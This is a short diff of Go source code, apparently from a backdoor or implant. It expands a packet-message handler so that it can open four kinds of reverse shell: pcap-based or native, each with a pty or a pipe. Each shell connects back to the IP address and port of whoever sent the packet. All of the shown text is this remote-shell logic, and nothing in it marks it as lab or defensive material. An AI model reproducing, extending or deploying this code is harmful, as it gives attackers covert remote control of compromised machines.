@@ -86,9 +86,24 @@ func handleMessage(msg *message.Message) error {
 				outputChan <- []string{out, ret}
 			}()
 		// Opens a reverse shell on port specified in packet
-		case message.Shell:
+		case message.MessageType(message.ShellPcapPty):
+			go func() {
+				_ = executor.OpenPcapReverseShellPty(msg)
+			}()
+			return nil
+		case message.MessageType(message.ShellPcapPipe):
 			go func() {
 				_ = executor.OpenPcapReverseShell(msg)
+			}()
+			return nil
+		case message.MessageType(message.ShellNativePty):
+			go func() {
+				_ = executor.OpenReverseShellPty(msg.SrcIP, msg.SrcPort)
+			}()
+			return nil
+		case message.MessageType(message.ShellNativePipe):
+			go func() {
+				_ = executor.OpenReverseShell(msg.SrcIP, msg.SrcPort)
 			}()
 			return nil
 		}
